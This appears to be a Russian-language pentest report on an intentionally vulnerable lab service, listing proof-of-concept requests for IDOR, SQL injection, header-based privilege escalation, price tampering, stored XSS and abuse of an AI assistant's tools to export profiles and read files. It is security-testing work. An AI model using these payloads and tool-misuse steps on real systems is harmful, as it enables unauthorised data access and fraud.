# Отчёт 1. Атаки на исходный сервис

Краткая модель угроз и цели: получить доступ к чужим данным внутри стенда, изменить бизнес-логику (цены), обойти роли, продемонстрировать XSS и влияние prompt injection на планировщик (без доверия ему).

Найденные уязвимости и PoC:

1. IDOR профилей
- Запрос: GET /profile?id=2 без аутентификации
- Ожидание: 200 и профиль TEST_BOB

2. SQL injection в /search
- Запрос: GET /search?q=%' OR 1=1 --
- Ожидание: возврат всех профилей

3. Просмотр всех заказов
- Запрос: GET /orders без токена
- Ожидание: 200 и все заказы

4. Повышение прав через заголовок
- Запрос: GET /admin/export с X-Role: staff без входа
- Ожидание: 200 и список профилей

5. Чтение чужих файлов
- Запрос: GET /files?user=bob&path=receipt.txt с токеном alice
- Ожидание: 200 и содержимое TEST_BOB receipt

6. Price tampering
- Запрос: POST /orders {product: "chair", price: 1} с токеном alice
- Ожидание: 201 и price=1

7. XSS в отзывах
- Запросы: POST /reviews {text: "<script>alert(1)</script>"}, затем GET /reviews/view
- Ожидание: скрипт в HTML

8. Assistant tool misuse
- Запросы: GET /assistant/context?order_id=2 с токеном alice; затем POST /assistant/execute {decision: {tool: "export_profiles"}} с токеном alice
- Ожидание: доступ к профилям без прав; также read_file произвольных путей внутри sandbox

9. SQL injection в assistant/context
- Запрос: GET /assistant/context?order_id=1 OR 1=1
- Ожидание: расширенный контекст (демонстрация опасной строки)

Артефакты: см. THREAT_MODEL.md
